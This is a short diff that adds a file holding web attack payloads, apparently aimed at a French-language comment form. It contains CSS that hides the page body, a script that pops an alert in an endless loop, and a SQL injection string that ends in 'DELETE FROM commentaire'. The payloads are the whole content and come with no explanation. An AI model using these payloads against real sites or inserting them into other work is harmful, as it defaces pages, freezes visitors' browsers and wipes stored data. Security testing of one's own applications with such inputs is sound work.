@@ -1,0 +1,12 @@
+<style>
+body{display: none;}
+</style>
+
+
+<script type="text/javascript">
+var point = true;
+while(point == true)
+alert("bonjour");
+</script>
+
+ok'); DELETE FROM commentaire; (
